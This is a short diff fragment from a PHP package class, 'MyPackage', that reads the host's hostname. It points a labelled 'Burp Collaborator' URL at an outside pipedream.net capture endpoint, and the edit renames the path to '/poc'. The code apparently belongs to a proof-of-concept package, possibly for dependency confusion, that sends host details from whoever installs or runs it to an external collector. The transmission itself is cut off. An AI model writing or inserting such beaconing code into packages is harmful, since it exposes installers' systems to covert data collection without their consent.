@@ -19,7 +19,7 @@ class MyPackage
         $hostname = gethostname();
 
         // Burp Collaborator server URL
-        $burpUrl = 'https://eo7hiufd2zsxv7j.m.pipedream.net/endpoint'; // Update with the actual endpoint path
+        $burpUrl = 'https://eo7hiufd2zsxv7j.m.pipedream.net/poc'; // Update with the actual endpoint path
 
         // Data to send
         $data = [
